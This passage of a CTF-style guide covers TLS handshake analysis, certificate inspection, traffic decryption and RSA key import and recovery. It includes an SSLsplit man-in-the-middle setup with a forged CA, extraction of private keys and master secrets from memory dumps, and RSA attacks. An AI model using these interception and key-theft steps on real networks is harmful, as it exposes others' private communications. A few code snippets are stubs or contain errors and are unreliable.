7. **ChangeCipherSpec** - Both parties switch to encrypted communication
8. **Finished** - Encrypted handshake verification messages

**TLS 1.3 Simplified Handshake:**

- Reduced to 1-RTT (round-trip time)
- Combined key exchange and authentication
- Encrypted handshake messages after ServerHello

### Wireshark Handshake Analysis

**Capture and Filter TLS Traffic:**

```bash
# Capture on interface with SSL/TLS filter
tshark -i eth0 -f "tcp port 443" -w tls_capture.pcap

# Read and filter for TLS handshakes
tshark -r capture.pcap -Y "ssl.handshake" -V

# Filter specific handshake types
tshark -r capture.pcap -Y "ssl.handshake.type == 1"  # ClientHello
tshark -r capture.pcap -Y "ssl.handshake.type == 2"  # ServerHello
tshark -r capture.pcap -Y "ssl.handshake.type == 11" # Certificate
```

**Wireshark Display Filters:**

```
tls.handshake                          # All handshake messages
tls.handshake.type == 1                # ClientHello only
tls.handshake.ciphersuite              # View cipher suites
tls.handshake.extensions               # View extensions
tls.handshake.extensions_server_name   # SNI (Server Name Indication)
ssl.record.version                     # Protocol version
```

### Key Information Extraction

**ClientHello Analysis:**

```bash
# Extract cipher suites offered
tshark -r capture.pcap -Y "tls.handshake.type == 1" \
  -T fields -e tls.handshake.ciphersuite

# Extract SNI (Server Name Indication)
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" \
  -T fields -e tls.handshake.extensions_server_name

# Extract supported TLS versions
tshark -r capture.pcap -Y "tls.handshake.type == 1" \
  -T fields -e tls.handshake.version

# Extract extensions
tshark -r capture.pcap -Y "tls.handshake.type == 1" \
  -T fields -e tls.handshake.extension.type
```

**ServerHello Analysis:**

```bash
# Extract selected cipher suite
tshark -r capture.pcap -Y "tls.handshake.type == 2" \
  -T fields -e tls.handshake.ciphersuite

# Extract session ID
tshark -r capture.pcap -Y "tls.handshake.type == 2" \
  -T fields -e tls.handshake.session_id
```

### Identifying Vulnerabilities

**Weak Cipher Suite Detection:**

```bash
# Filter for weak ciphers (RC4, DES, NULL, EXPORT)
tshark -r capture.pcap -Y "tls.handshake.ciphersuite matches \"(RC4|DES|NULL|EXPORT)\""

# Filter for non-forward secrecy ciphers
tshark -r capture.pcap -Y "tls.handshake.ciphersuite && !(tls.handshake.ciphersuite matches \"(DHE|ECDHE)\")"

# Detect SSLv3 or TLS 1.0
tshark -r capture.pcap -Y "ssl.record.version == 0x0300"  # SSLv3
tshark -r capture.pcap -Y "ssl.record.version == 0x0301"  # TLS 1.0
```

**Protocol Downgrade Detection:**

```bash
# Compare ClientHello vs ServerHello versions
tshark -r capture.pcap -Y "tls.handshake.type == 1 || tls.handshake.type == 2" \
  -T fields -e frame.number -e tls.handshake.type -e tls.handshake.version
```

### Using ssldump

**Installation:**

```bash
apt-get install ssldump
```

**Basic Analysis:**

```bash
# Live capture on interface
ssldump -i eth0

# Read from pcap file
ssldump -r capture.pcap

# Decode with specific key file
ssldump -r capture.pcap -k server.key

# Show more detail (-A for ASCII, -d for packet data)
ssldump -r capture.pcap -A -d

# Filter by host
ssldump -r capture.pcap host 192.168.1.100

# Output to file
ssldump -r capture.pcap -o output.txt
```

**Handshake-Specific Output:**

```bash
# View only handshake messages
ssldump -r capture.pcap | grep -A 10 "ClientHello\|ServerHello\|Certificate"
```

### Python-Based Analysis with Scapy

```python
from scapy.all import *
from scapy.layers.tls.all import *

# Load PCAP
packets = rdpcap('capture.pcap')

# Extract TLS handshakes
for pkt in packets:
    if pkt.haslayer(TLS):
        tls_layer = pkt[TLS]
        
        # ClientHello
        if tls_layer.haslayer(TLSClientHello):
            client_hello = tls_layer[TLSClientHello]
            print(f"[ClientHello]")
            print(f"  Version: {client_hello.version}")
            print(f"  Cipher Suites: {client_hello.ciphersuites}")
            
            # Extract SNI
            if hasattr(client_hello, 'ext'):
                for ext in client_hello.ext:
                    if hasattr(ext, 'servernames'):
                        print(f"  SNI: {ext.servernames}")
        
        # ServerHello
        if tls_layer.haslayer(TLSServerHello):
            server_hello = tls_layer[TLSServerHello]
            print(f"[ServerHello]")
            print(f"  Selected Cipher: {server_hello.cipher}")
            print(f"  Session ID: {server_hello.sid}")
```

### JA3/JA3S Fingerprinting

JA3 creates fingerprints of TLS clients and servers based on handshake parameters.

**Using ja3 Tool:**

```bash
# Install
pip install pyja3

# Generate JA3 from pcap
python -m ja3 capture.pcap

# Using tshark with ja3 plugin (requires Wireshark 3.0+)
tshark -r capture.pcap -Y "tls.handshake.type == 1" \
  -T fields -e tls.handshake.ja3
```

**Manual JA3 Calculation Elements:**

- SSLVersion
- Cipher suites
- Extension list
- Elliptic curves
- Elliptic curve point formats

### Common CTF Scenarios

**Extracting Hidden Data in Handshake:**

- Custom extensions containing encoded flags
- Unusual certificate fields
- Session ticket data
- Application Layer Protocol Negotiation (ALPN) fields

**Command for Extension Extraction:**

```bash
tshark -r capture.pcap -Y "tls.handshake.extensions" \
  -T fields -e tls.handshake.extension.data -x
```

## Certificate Inspection

### X.509 Certificate Structure

**Certificate Components:**

- **Version** - X.509 version (v1, v2, v3)
- **Serial Number** - Unique identifier
- **Signature Algorithm** - Algorithm used to sign certificate
- **Issuer** - CA that issued the certificate
- **Validity Period** - Not Before/Not After dates
- **Subject** - Entity the certificate represents
- **Public Key** - Subject's public key and algorithm
- **Extensions** (v3) - Additional attributes

### Extracting Certificates from Traffic

**Wireshark Certificate Export:**

```bash
# Filter for certificate messages
tshark -r capture.pcap -Y "tls.handshake.certificate" -V

# Export certificate chain to PEM
tshark -r capture.pcap -Y "tls.handshake.certificate" \
  --export-objects ssl,./exported_certs/

# Alternative: Extract as hex and convert
tshark -r capture.pcap -Y "tls.handshake.certificate" \
  -T fields -e tls.handshake.certificate -x > cert_hex.txt
```

**Using SSL Strip Scripts:**

```bash
# Extract certificates with Python
python3 << 'EOF'
from scapy.all import *
from scapy.layers.tls.all import *

packets = rdpcap('capture.pcap')
cert_count = 0

for pkt in packets:
    if pkt.haslayer(TLSCertificate):
        cert_list = pkt[TLSCertificate].certs
        for cert in cert_list:
            with open(f'cert_{cert_count}.der', 'wb') as f:
                f.write(cert[1])
            cert_count += 1
EOF

# Convert DER to PEM
for cert in cert_*.der; do
    openssl x509 -inform DER -in "$cert" -out "${cert%.der}.pem"
done
```

### Certificate Analysis with OpenSSL

**Basic Certificate Inspection:**

```bash
# View certificate details
openssl x509 -in certificate.pem -text -noout

# View specific fields
openssl x509 -in certificate.pem -noout -subject
openssl x509 -in certificate.pem -noout -issuer
openssl x509 -in certificate.pem -noout -dates
openssl x509 -in certificate.pem -noout -serial
openssl x509 -in certificate.pem -noout -fingerprint

# View public key
openssl x509 -in certificate.pem -noout -pubkey

# View signature algorithm
openssl x509 -in certificate.pem -noout -text | grep "Signature Algorithm"
```

**Certificate Chain Verification:**

```bash
# Verify certificate against CA
openssl verify -CAfile ca_cert.pem certificate.pem

# Verify full chain
openssl verify -CAfile root.pem -untrusted intermediate.pem certificate.pem

# Check certificate purpose
openssl x509 -in certificate.pem -noout -purpose
```

**Extract Certificate Components:**

```bash
# Extract public key to file
openssl x509 -in certificate.pem -pubkey -noout > pubkey.pem

# Extract modulus (for RSA)
openssl x509 -in certificate.pem -noout -modulus

# Extract exponent
openssl x509 -in certificate.pem -text -noout | grep "Exponent"

# Convert formats
openssl x509 -in certificate.pem -outform DER -out certificate.der
openssl x509 -in certificate.der -inform DER -outform PEM -out certificate.pem
```

### Extension Analysis

**Common Extensions:**

```bash
# View all extensions
openssl x509 -in certificate.pem -text -noout | grep -A 10 "X509v3 extensions"

# Subject Alternative Name (SAN)
openssl x509 -in certificate.pem -text -noout | grep -A 1 "Subject Alternative Name"

# Key Usage
openssl x509 -in certificate.pem -text -noout | grep -A 1 "Key Usage"

# Extended Key Usage
openssl x509 -in certificate.pem -text -noout | grep -A 1 "Extended Key Usage"

# Basic Constraints (CA:TRUE/FALSE)
openssl x509 -in certificate.pem -text -noout | grep -A 1 "Basic Constraints"

# Certificate Policies
openssl x509 -in certificate.pem -text -noout | grep -A 5 "Certificate Policies"
```

**CTF-Relevant Custom Extensions:**

```bash
# Dump all extension OIDs and values
openssl x509 -in certificate.pem -text -noout | grep -E "^\s+(X509v3|[0-9]+\.[0-9]+)"

# Extract specific OID (example: 1.2.3.4.5)
openssl x509 -in certificate.pem -text -noout | grep -A 2 "1.2.3.4.5"
```

### Certificate Validation Issues

**Self-Signed Certificate Detection:**

```bash
# Check if issuer equals subject
openssl x509 -in certificate.pem -noout -subject -issuer | \
  awk '{if(NR==1) subj=$0; if(NR==2 && $0==subj) print "Self-signed"}'
```

**Expired Certificate Detection:**

```bash
# Check validity dates
openssl x509 -in certificate.pem -noout -checkend 0 && echo "Valid" || echo "Expired"

# Check specific future time (seconds)
openssl x509 -in certificate.pem -noout -checkend 86400  # 24 hours
```

**Weak Signature Algorithm:**

```bash
# Detect MD5 or SHA1
openssl x509 -in certificate.pem -text -noout | grep "Signature Algorithm" | grep -E "(md5|sha1)"
```

### Certificate Forensics

**Compare Certificates:**

```bash
# Compare fingerprints
openssl x509 -in cert1.pem -noout -fingerprint -sha256
openssl x509 -in cert2.pem -noout -fingerprint -sha256

# Compare public keys
diff <(openssl x509 -in cert1.pem -noout -pubkey) \
     <(openssl x509 -in cert2.pem -noout -pubkey)
```

**Extract Hidden Data:**

```bash
# Examine certificate in hex
openssl x509 -in certificate.pem -outform DER | xxd

# Search for specific strings
openssl x509 -in certificate.pem -text -noout | strings | grep -i "flag\|ctf\|hidden"

# Check for unusual OIDs
openssl asn1parse -in certificate.pem | grep "OBJECT"
```

### Python-Based Certificate Analysis

```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import binascii

# Load certificate
with open('certificate.pem', 'rb') as f:
    cert_data = f.read()
    cert = x509.load_pem_x509_certificate(cert_data, default_backend())

# Extract basic info
print(f"Subject: {cert.subject}")
print(f"Issuer: {cert.issuer}")
print(f"Serial: {cert.serial_number}")
print(f"Not Valid Before: {cert.not_valid_before}")
print(f"Not Valid After: {cert.not_valid_after}")

# Extract public key
public_key = cert.public_key()
print(f"Public Key Algorithm: {type(public_key).__name__}")

# Extract extensions
for ext in cert.extensions:
    print(f"Extension OID: {ext.oid.dotted_string}")
    print(f"  Critical: {ext.critical}")
    print(f"  Value: {ext.value}")

# Extract SAN
try:
    san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
    for name in san.value:
        print(f"SAN: {name.value}")
except x509.ExtensionNotFound:
    pass

# Extract public key components (RSA)
from cryptography.hazmat.primitives.asymmetric import rsa
if isinstance(public_key, rsa.RSAPublicKey):
    numbers = public_key.public_numbers()
    print(f"Modulus (n): {hex(numbers.n)}")
    print(f"Exponent (e): {numbers.e}")
```

### Certificate Transparency Logs

**Searching for Certificates:**

```bash
# Using crt.sh (Certificate Transparency search)
curl -s "https://crt.sh/?q=example.com&output=json" | jq .

# Using certstream (real-time CT monitoring)
pip install certstream
python -c "import certstream; certstream.listen_for_events(lambda m, c: print(m), url='wss://certstream.calidog.io/')"
```

## SSL/TLS Decryption Techniques

### Prerequisites for Decryption

**Decryption is possible when you have:**

1. RSA private key (for RSA key exchange)
2. Pre-master secret (from browser/client)
3. Session keys (extracted from memory)
4. SSLKEYLOGFILE (browser key logging)

**[Inference]** Forward secrecy cipher suites (DHE, ECDHE) cannot be decrypted with only the server's private key - the ephemeral keys are required.

### SSLKEYLOGFILE Method

**Browser Key Logging:**

```bash
# Set environment variable (Linux/macOS)
export SSLKEYLOGFILE=/path/to/sslkeys.log

# Firefox: about:config
# Set security.ssl.keyLogFile to /path/to/sslkeys.log

# Chrome/Chromium launch with logging
google-chrome --ssl-key-log-file=/path/to/sslkeys.log

# Launch Firefox with logging
SSLKEYLOGFILE=/tmp/sslkeys.log firefox

# Capture traffic while browser logs keys
tshark -i eth0 -w traffic.pcap
```

**SSLKEYLOGFILE Format:**

```
CLIENT_RANDOM <client_random_hex> <master_secret_hex>
```

**Decrypt with Wireshark:**

1. Edit → Preferences → Protocols → TLS
2. (Pre-)Master-Secret log filename: browse to sslkeys.log
3. Open capture file - decrypted data appears in "Decrypted SSL" tab

**Decrypt with tshark:**

```bash
# Using SSLKEYLOGFILE
tshark -r encrypted.pcap \
  -o tls.keylog_file:sslkeys.log \
  -Y "http" -V

# Export decrypted HTTP objects
tshark -r encrypted.pcap \
  -o tls.keylog_file:sslkeys.log \
  --export-objects http,./exported/

# View decrypted application data
tshark -r encrypted.pcap \
  -o tls.keylog_file:sslkeys.log \
  -Y "tls.app_data" -T fields -e tls.app_data -x
```

### Using Server Private Key (RSA Only)

**Configuration in Wireshark:**

1. Edit → Preferences → Protocols → TLS
2. RSA keys list → Edit
3. Add entry:
    - IP address: server IP
    - Port: 443 (or relevant)
    - Protocol: http (or relevant)
    - Key File: /path/to/server.key

**Tshark with Private Key:**

```bash
# Decrypt using RSA private key
tshark -r capture.pcap \
  -o tls.keys_list:"192.168.1.100,443,http,/path/to/server.key" \
  -Y "http" -V

# Multiple keys
tshark -r capture.pcap \
  -o tls.keys_list:"192.168.1.100,443,http,/path/to/key1.pem;192.168.1.200,443,http,/path/to/key2.pem" \
  -Y "http"
```

**Verify Key Format:**

```bash
# Check if key is in correct format
openssl rsa -in server.key -check

# Convert from encrypted to plaintext
openssl rsa -in encrypted.key -out plaintext.key

# Extract private key from PFX/P12
openssl pkcs12 -in certificate.pfx -nocerts -out private.key -nodes

# Convert DER to PEM
openssl rsa -inform DER -in server.key -outform PEM -out server.pem
```

### Limitations of Private Key Decryption

**Cannot Decrypt:**

- Sessions using ephemeral Diffie-Hellman (DHE, ECDHE)
- TLS 1.3 (always uses ephemeral keys)
- Sessions with Perfect Forward Secrecy (PFS)

**Check Cipher Suite in Capture:**

```bash
# Identify if decryption is possible
tshark -r capture.pcap -Y "tls.handshake.type == 2" \
  -T fields -e tls.handshake.ciphersuite

# Look for ciphers containing DHE or ECDHE (cannot decrypt with private key only)
```

### Memory Dump Analysis

**Extract Keys from Memory:**

```bash
# Using strings to find potential keys
strings memory.dump | grep -E "BEGIN (RSA )?PRIVATE KEY"

# Using volatility framework
volatility -f memory.dump --profile=<profile> memdump -p <PID> -D ./

# Search for TLS master secrets in memory
strings memory.dump | grep -E "[0-9a-fA-F]{96}" > potential_secrets.txt
```

**Reconstructing SSLKEYLOGFILE from Memory:**

```python
import re

# Search memory dump for CLIENT_RANDOM patterns
with open('memory.dump', 'rb') as f:
    data = f.read()
    
# Pattern for master secret (48 bytes = 96 hex chars)
pattern = rb'CLIENT_RANDOM ([0-9a-fA-F]{64}) ([0-9a-fA-F]{96})'
matches = re.findall(pattern, data)

with open('recovered_keys.log', 'w') as out:
    for match in matches:
        out.write(f"CLIENT_RANDOM {match[0].decode()} {match[1].decode()}\n")
```

### Decrypting Specific TLS Records

**Manual Decryption Process:** [Inference] Manual decryption requires implementing or using the TLS PRF (Pseudo-Random Function) to derive encryption keys from the master secret.

```python
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
import struct

# TLS 1.2 PRF implementation (simplified)
def prf_tls12(secret, label, seed, length):
    """TLS 1.2 Pseudo-Random Function"""
    # [Inference] This is a simplified representation
    # Full implementation requires proper HMAC iteration
    pass

# Derive keys from master secret
def derive_keys(master_secret, client_random, server_random):
    seed = label + client_random + server_random
    key_block = prf_tls12(master_secret, b"key expansion", seed, needed_bytes)
    
    # Split key block into individual keys
    # client_write_MAC_key, server_write_MAC_key,
    # client_write_key, server_write_key,
    # client_write_IV, server_write_IV
    pass
```

### Using SSLsplit for Man-in-the-Middle

**SSLsplit Setup:**

```bash
# Install
apt-get install sslsplit

# Generate CA certificate
openssl req -new -x509 -days 3650 -nodes \
  -out ca.crt -keyout ca.key \
  -subj "/C=US/ST=State/L=City/O=Org/CN=SSLsplit CA"

# Run sslsplit
sslsplit -D -l connections.log -j /tmp/sslsplit/ \
  -S /tmp/sslsplit/logdir/ \
  -k ca.key -c ca.crt \
  ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# Configure iptables redirect (example)
iptables -t nat -A PREROUTING -p tcp --dport 443 \
  -j REDIRECT --to-ports 8443
```

### Decryption Automation Scripts

**Batch Decryption:**

```bash
#!/bin/bash
# decrypt_all.sh - Decrypt multiple pcaps with same keylog

KEYLOG="sslkeys.log"
OUTPUT_DIR="decrypted"

mkdir -p "$OUTPUT_DIR"

for pcap in *.pcap; do
    echo "Decrypting $pcap..."
    tshark -r "$pcap" \
      -o tls.keylog_file:"$KEYLOG" \
      -w "${OUTPUT_DIR}/${pcap%.pcap}_decrypted.pcap"
done
```

**Extract Decrypted HTTP:**

```bash
#!/bin/bash
# extract_http.sh

tshark -r encrypted.pcap \
  -o tls.keylog_file:sslkeys.log \
  -Y "http.request or http.response" \
  -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e http.request.method \
  -e http.request.uri \
  -e http.response.code \
  -e http.file_data \
  -E header=y \
  -E separator=, > http_sessions.csv
```

## RSA Key Import

### Key Format Conversion

**Common Key Formats:**

- **PEM** - Base64 encoded with headers (-----BEGIN/END-----)
- **DER** - Binary ASN.1 encoding
- **PFX/P12** - PKCS#12 archive (contains cert + private key)
- **JKS** - Java KeyStore

**PEM to DER:**

```bash
openssl rsa -in private.pem -outform DER -out private.der
openssl x509 -in cert.pem -outform DER -out cert.der
```

**DER to PEM:**

```bash
openssl rsa -inform DER -in private.der -outform PEM -out private.pem
openssl x509 -inform DER -in cert.der -outform PEM -out cert.pem
```

**PFX/P12 to PEM:**

```bash
# Extract private key
openssl pkcs12 -in certificate.pfx -nocerts -out private.key -nodes

# Extract certificate
openssl pkcs12 -in certificate.pfx -clcerts -nokeys -out certificate.crt

# Extract CA certificates
openssl pkcs12 -in certificate.pfx -cacerts -nokeys -out ca_chain.crt
```

**Remove Passphrase from Key:**

```bash
# Decrypt private key
openssl rsa -in encrypted_private.key -out decrypted_private.key

# Or with specific cipher
openssl rsa -in encrypted_private.key -passin pass:yourpassword -out decrypted_private.key
```

**Add Passphrase to Key:**

```bash
openssl rsa -in private.key -des3 -out encrypted_private.key
```

### Verify Key Matches Certificate

**Compare Modulus:**

```bash
# Get certificate modulus
openssl x509 -noout -modulus -in certificate.crt | openssl md5

# Get private key modulus
openssl rsa -noout -modulus -in private.key | openssl md5

# If MD5 hashes match, the key pair is valid
```

**Compare Public Keys:**

```bash
# Extract public key from certificate
openssl x509 -in certificate.crt -pubkey -noout > cert_pubkey.pem

# Extract public key from private key
openssl rsa -in private.key -pubout -out key_pubkey.pem

# Compare
diff cert_pubkey.pem key_pubkey.pem
```

### Import into Wireshark

**GUI Method:**

1. Edit → Preferences → Protocols → TLS
2. RSA keys list → Edit → Add new entry
3. Fill in:
    - IP address: server IP (use 0.0.0.0 for any)
    - Port: 443 (or start_tls)
    - Protocol: http/data/etc.
    - Key File: browse to .pem file
    - Password: if key is encrypted

**Configuration File Method:**

```bash
# Location: ~/.config/wireshark/preferences
# Add line:
tls.keys_list: "192.168.1.100","443","http","/path/to/server.key"

# Multiple keys separated by semicolon
tls.keys_list: "192.168.1.100","443","http","/path/to/key1.pem";"192.168.1.200","443","http","/path/to/key2.pem"
```

### Import via Command Line (tshark)

**Basic Syntax:**

```bash
tshark -r capture.pcap \
  -o "tls.keys_list:IP,PORT,PROTOCOL,KEYFILE" \
  -V
```

**Examples:**

```bash
# Single key
tshark -r encrypted.pcap \
  -o "tls.keys_list:192.168.1.100,443,http,/path/to/server.key" \
  -Y http

# Any IP (use 0.0.0.0)
tshark -r encrypted.pcap \
  -o "tls.keys_list:0.0.0.0,443,http,/path/to/server.key" \
  -Y http

# Multiple keys
tshark -r encrypted.pcap \
  -o "tls.keys_list:192.168.1.100,443,http,/keys/key1.pem;192.168.1.200,443,http,/keys/key2.pem" \
  -Y http

# With password-protected key (specify password in prompt)
tshark -r encrypted.pcap \
  -o "tls.keys_list:192.168.1.100,443,http,/path/to/encrypted.key,password123" \
  -Y http
```

### Troubleshooting Key Import

**Common Issues:**

1. **"Private key import failed"**

```bash
# Verify key format
openssl rsa -in private.key -check -noout

# Try converting format
openssl rsa -in private.key -out private_converted.pem
```

2. **"No decryption occurs"**

```bash
# Check cipher suite in handshake
tshark -r capture.pcap -Y "tls.handshake.type == 2" \
  -T fields -e tls.handshake.ciphersuite

# If contains DHE or ECDHE, private key won't work
# Look for RSA key exchange ciphers like:
# TLS_RSA_WITH_AES_128_CBC_SHA
# TLS_RSA_WITH_AES_256_GCM_SHA384
```

3. **"Wrong IP or port"**

```bash
# Find actual server IP and port
tshark -r capture.pcap -Y "tls.handshake" \
  -T fields -e ip.dst -e tcp.dstport | sort -u

# Use 0.0.0.0 and 0 as wildcards
tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,0,http,/path/to/server.key"
```

### Extract RSA Private Key Components

**For Cryptographic Operations:**

```bash
# Extract components in text format
openssl rsa -in private.key -text -noout

# Output includes:
# - modulus (n)
# - publicExponent (e)
# - privateExponent (d)
# - prime1 (p)
# - prime2 (q)
# - exponent1 (d mod (p-1))

# - exponent2 (d mod (q-1))

# - coefficient (q^-1 mod p)
````

**Python RSA Key Extraction:**
```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Load private key
with open('private.key', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Extract RSA components
from cryptography.hazmat.primitives.asymmetric import rsa
if isinstance(private_key, rsa.RSAPrivateKey):
    private_numbers = private_key.private_numbers()
    public_numbers = private_numbers.public_numbers
    
    print(f"Modulus (n): {hex(public_numbers.n)}")
    print(f"Public Exponent (e): {public_numbers.e}")
    print(f"Private Exponent (d): {hex(private_numbers.d)}")
    print(f"Prime p: {hex(private_numbers.p)}")
    print(f"Prime q: {hex(private_numbers.q)}")
    print(f"dmp1 (d mod p-1): {hex(private_numbers.dmp1)}")
    print(f"dmq1 (d mod q-1): {hex(private_numbers.dmq1)}")
    print(f"iqmp (q^-1 mod p): {hex(private_numbers.iqmp)}")
    
    # Verify relationship
    assert public_numbers.n == private_numbers.p * private_numbers.q
````

**Using OpenSSL ASN.1 Parser:**

```bash
# Parse key structure
openssl asn1parse -in private.key

# Extract specific component (e.g., modulus at offset)
openssl asn1parse -in private.key -strparse <offset>

# Dump in hex
openssl asn1parse -in private.key -dump
```

### Reconstruct Private Key from Components

**From Known n, e, d:**

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Known values (as integers)
n = 0x00c55e...  # modulus
e = 65537        # public exponent
d = 0x0896...    # private exponent

# Calculate p and q from n, e, d (if not known)
# [Inference] This requires factoring or using extended algorithms
# For CTF, p and q are often provided

p = 0x00d8...
q = 0x00f1...

# Calculate CRT components
dmp1 = d % (p - 1)
dmq1 = d % (q - 1)
iqmp = pow(q, -1, p)  # q^-1 mod p

# Construct private key
public_numbers = rsa.RSAPublicNumbers(e, n)
private_numbers = rsa.RSAPrivateNumbers(
    p=p,
    q=q,
    d=d,
    dmp1=dmp1,
    dmq1=dmq1,
    iqmp=iqmp,
    public_numbers=public_numbers
)

private_key = private_numbers.private_key(default_backend())

# Export to PEM
pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

with open('reconstructed.key', 'wb') as f:
    f.write(pem)
```

### CTF-Specific Key Recovery Scenarios

**Scenario 1: Weak RSA Key (Small Factors)**

```python
import gmpy2

# Given weak modulus
n = 0x... # small n value
e = 65537

# Try factoring with fermat, pollard rho, etc.
from sympy import factorint
factors = factorint(n)
p, q = list(factors.keys())

# Calculate d
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)

# Reconstruct key (use code above)
```

**Scenario 2: Partial Key Leakage**

```python
# Known: n, e, and partial d (e.g., LSBs or MSBs)
# [Inference] Requires Coppersmith's attack or lattice methods
# Tools: SageMath, FeatherDuster

# Example using known LSBs
import subprocess

sage_script = """
n = ...
e = ...
d_partial = ...  # known bits
# Use Coppersmith attack
"""

with open('attack.sage', 'w') as f:
    f.write(sage_script)

subprocess.run(['sage', 'attack.sage'])
```

**Scenario 3: Common Modulus Attack**

```python
# Two certificates with same n but different e values
def common_modulus_attack(n, e1, e2, c1, c2):
    """
    Decrypt when two messages encrypted with same n, different e
    """
    from gmpy2 import gcd, invert
    
    # Calculate gcd and Bezout coefficients
    g, a, b = gmpy2.gcdext(e1, e2)
    
    if g != 1:
        return None
    
    # Make exponents positive
    if a < 0:
        c1 = invert(c1, n)
        a = -a
    if b < 0:
        c2 = invert(c2, n)
        b = -b
    
    # Recover plaintext
    m = (pow(c1, a, n) * pow(c2, b, n)) % n
    return m
```

**Scenario 4: Extract Key from Memory Dump**

```bash
# Search for RSA key markers
strings memory.dump | grep -A 50 "BEGIN RSA PRIVATE KEY"

# Extract PEM blocks
grep -Pzo "-----BEGIN RSA PRIVATE KEY-----.*?-----END RSA PRIVATE KEY-----" memory.dump > extracted.key

# Validate extracted key
openssl rsa -in extracted.key -check -noout
```

### Automated Key Import Scripts

**Batch Import Multiple Keys:**

```bash
#!/bin/bash
# import_all_keys.sh

PCAP="capture.pcap"
KEY_DIR="/path/to/keys"
OUTPUT="decrypted_output"

# Build key list string
KEY_LIST=""
for key in "$KEY_DIR"/*.pem; do
    # Extract IP from key filename (e.g., server_192.168.1.100.key)
    IP=$(basename "$key" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
    
    if [ -z "$IP" ]; then
        IP="0.0.0.0"  # Use wildcard if no IP in filename
    fi
    
    if [ -n "$KEY_LIST" ]; then
        KEY_LIST="$KEY_LIST;"
    fi
    KEY_LIST="${KEY_LIST}${IP},443,http,${key}"
done

# Decrypt with all keys
echo "Using keys: $KEY_LIST"
tshark -r "$PCAP" \
  -o "tls.keys_list:$KEY_LIST" \
  -w "${OUTPUT}.pcap"

echo "Decrypted traffic saved to ${OUTPUT}.pcap"
```

**Test Key Against Capture:**

```bash
#!/bin/bash
# test_key.sh - Verify if key can decrypt traffic

PCAP="$1"
KEY="$2"

if [ -z "$PCAP" ] || [ -z "$KEY" ]; then
    echo "Usage: $0 <pcap> <key>"
    exit 1
fi

# Try decryption and check for decrypted HTTP
RESULT=$(tshark -r "$PCAP" \
  -o "tls.keys_list:0.0.0.0,0,http,$KEY" \
  -Y "http" -T field -e http.request.uri 2>/dev/null | head -n 1)

if [ -n "$RESULT" ]; then
    echo "[+] Key successfully decrypts traffic"
    echo "[+] Sample decrypted URI: $RESULT"
    exit 0
else
    echo "[-] Key does not decrypt traffic"
    echo "[-] Possible reasons:"
    echo "    - Wrong key"
    echo "    - Forward secrecy cipher suite (DHE/ECDHE)"
    echo "    - Key format issue"
    exit 1
fi
```

### Import Keys for Other Protocols

**HTTPS/HTTP:**
```bash
tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,443,http,server.key" \
  -Y http
```

**SMTP over TLS (STARTTLS):**
```bash
tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,587,smtp,mail.key" \
  -Y smtp
```

**IMAP over TLS:**
```bash
tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,993,imap,imap.key" \
  -Y imap
```

**POP3 over TLS:**
```bash
tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,995,pop,pop3.key" \
  -Y pop
```

**LDAP over TLS:**
```bash
tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,636,ldap,ldap.key" \
  -Y ldap
```

**Generic TLS (when protocol unknown):**
```bash
tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,0,data,server.key" \
  -Y "tls.app_data" -T fields -e tls.app_data -x
```

### Wireshark Decryption Preferences File

**Create Portable Configuration:**
```bash
# Create preferences file
cat > tls_decrypt_prefs << 'EOF'
# TLS Decryption Configuration
tls.desegment_ssl_records: TRUE
tls.desegment_ssl_application_data: TRUE
tls.keylog_file: /path/to/sslkeylogfile.log
tls.keys_list: "0.0.0.0","443","http","/path/to/server1.key";"0.0.0.0","8443","http","/path/to/server2.key"
http.desegment_headers: TRUE
http.desegment_body: TRUE
EOF

# Use with tshark
tshark -r capture.pcap -C tls_decrypt_prefs -Y http
```

### Verify Successful Decryption

**Check for Decrypted Layers:**
```bash
# Look for HTTP in decrypted TLS
tshark -r encrypted.pcap \
  -o "tls.keys_list:0.0.0.0,443,http,server.key" \
  -Y "http" -T fields -e http.request.method -e http.request.uri

# Check for decrypted application data
tshark -r encrypted.pcap \
  -o "tls.keys_list:0.0.0.0,443,http,server.key" \
  -Y "tls.app_data && tls.record.content_type == 23" | wc -l

# If count > 0, some decryption occurred
```

**Compare Encrypted vs Decrypted:**
```bash
# Count encrypted application data records
ENCRYPTED=$(tshark -r capture.pcap -Y "tls.app_data" | wc -l)

# Count decrypted HTTP requests
DECRYPTED=$(tshark -r capture.pcap \
  -o "tls.keys_list:0.0.0.0,0,http,server.key" \
  -Y "http.request" | wc -l)

echo "Encrypted records: $ENCRYPTED"
echo "Decrypted HTTP requests: $DECRYPTED"

if [ $DECRYPTED -gt 0 ]; then
    echo "Decryption successful"
else
    echo "Decryption failed"
fi
```

### Python Automation for Key Testing
```python
#!/usr/bin/env python3
import subprocess
import sys
import os
from pathlib import Path

def test_key_decryption(pcap_file, key_file):
    """Test if a key can decrypt traffic in pcap"""
    
    cmd = [
        'tshark',
        '-r', pcap_file,
        '-o', f'tls.keys_list:0.0.0.0,0,http,{key_file}',
        '-Y', 'http',
        '-T', 'fields',
        '-e', 'http.request.uri'
    ]
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.stdout.strip():
            return True, result.stdout.split('\n')[0]
        return False, None
        
    except subprocess.TimeoutExpired:
